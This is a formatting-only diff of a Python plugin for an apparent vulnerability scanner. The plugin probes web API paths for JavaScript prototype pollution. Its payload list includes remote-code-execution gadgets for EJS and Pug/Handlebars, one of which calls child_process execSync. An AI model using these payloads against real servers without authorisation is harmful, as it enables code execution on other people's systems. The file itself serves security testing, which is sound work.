@@ -1,11 +1,19 @@
 # plugins/prototype_pollution.py — Cascavel 2026 Intelligence
+
 import requests
-import json
 
-
-PAGES = ["/", "/api/", "/api/v1/", "/api/v1/users", "/api/v1/settings",
-         "/api/v1/config", "/api/v1/merge", "/api/v1/update",
-         "/api/v1/preferences", "/api/deep-merge"]
+PAGES = [
+    "/",
+    "/api/",
+    "/api/v1/",
+    "/api/v1/users",
+    "/api/v1/settings",
+    "/api/v1/config",
+    "/api/v1/merge",
+    "/api/v1/update",
+    "/api/v1/preferences",
+    "/api/deep-merge",
+]
 
 # ──────────── PROTOTYPE POLLUTION PAYLOADS (2026 Expanded) ────────────
 POST_PAYLOADS = [
@@ -19,7 +27,15 @@ POST_PAYLOADS = [
     ({"__proto__": {"status": 200}}, "__PROTO_STATUS_OVERRIDE"),
     ({"__proto__": {"admin": True, "debug": True}}, "__PROTO_MULTI_FIELD"),
     ({"__proto__": {"outputFunctionName": "x;console.log(1)//"}}, "__PROTO_EJS_RCE"),
-    ({"__proto__": {"client": True, "escapeFunction": "1;return global.process.mainModule.require('child_process').execSync('id')"}}, "__PROTO_PUGHBS"),
+    (
+        {
+            "__proto__": {
+                "client": True,
+                "escapeFunction": "1;return global.process.mainModule.require('child_process').execSync('id')",
+            }
+        },
+        "__PROTO_PUGHBS",
+    ),
     ({"__proto__": {"allow_b_ody_overwrite": True}}, "__PROTO_BODY_PARSER"),
 ]
 
@@ -37,14 +53,19 @@ def _test_post_proto(target, page, payload, method):
     url = f"http://{target}{page}"
     try:
         resp = requests.post(
-            url, json=payload, timeout=5,
+            url,
+            json=payload,
+            timeout=5,
             headers={"Content-Type": "application/json"},
         )
         if resp.status_code in [200, 201]:
             sev, desc = _classify_proto_vuln(method, resp.text)
             return {
-                "tipo": "PROTOTYPE_POLLUTION", "metodo": method,
-                "pagina": page, "severidade": sev, "descricao": desc,
+                "tipo": "PROTOTYPE_POLLUTION",
+                "metodo": method,
+                "pagina": page,
+                "severidade": sev,
+                "descricao": desc,
             }
     except Exception:
         pass
@@ -57,8 +78,10 @@ def _test_get_proto(target, page, payload, method):
         resp = requests.get(f"http://{target}{page}?{payload}", timeout=5)
         if "cascavel-test" in resp.text or resp.status_code not in [400, 404, 500]:
             return {
-                "tipo": "PROTOTYPE_POLLUTION_GET", "metodo": method,
-                "pagina": page, "severidade": "ALTO",
+                "tipo": "PROTOTYPE_POLLUTION_GET",
+                "metodo": method,
+                "pagina": page,
+                "severidade": "ALTO",
                 "descricao": f"Prototype pollution via GET — {method}",
             }
     except Exception:
@@ -72,11 +95,13 @@ def _test_text_plain(target, page):
         resp = requests.post(
             f"http://{target}{page}",
             data='{"__proto__":{"polluted":"cascavel-test"}}',
-            headers={"Content-Type": "text/plain"}, timeout=5,
+            headers={"Content-Type": "text/plain"},
+            timeout=5,
         )
         if resp.status_code == 200 and "cascavel-test" in resp.text:
             return {
-                "tipo": "PROTO_VIA_TEXT_PLAIN", "pagina": page,
+                "tipo": "PROTO_VIA_TEXT_PLAIN",
+                "pagina": page,
                 "severidade": "ALTO",
                 "descricao": "Prototype pollution via text/plain Content-Type bypass!",
             }
@@ -95,7 +120,8 @@ def _test_lodash_merge(target, page):
         )
         if resp.status_code in [200, 204] and "cascavel" in resp.text:
             return {
-                "tipo": "LODASH_MERGE_POLLUTION", "pagina": page,
+                "tipo": "LODASH_MERGE_POLLUTION",
+                "pagina": page,
                 "severidade": "CRITICO",
                 "descricao": "Lodash _.merge prototype pollution confirmada!",
             }
@@ -158,8 +184,15 @@ def run(target, ip, open_ports, banners):
     return {
         "plugin": "prototype_pollution",
         "versao": "2026.1",
-        "tecnicas": ["post_proto", "get_proto", "constructor_proto",
-                      "text_plain_bypass", "lodash_merge", "ejs_rce",
-                      "pug_handlebars_rce", "body_parser_override"],
+        "tecnicas": [
+            "post_proto",
+            "get_proto",
+            "constructor_proto",
+            "text_plain_bypass",
+            "lodash_merge",
+            "ejs_rce",
+            "pug_handlebars_rce",
+            "body_parser_override",
+        ],
         "resultados": vulns if vulns else "Nenhuma prototype pollution detectada",
     }
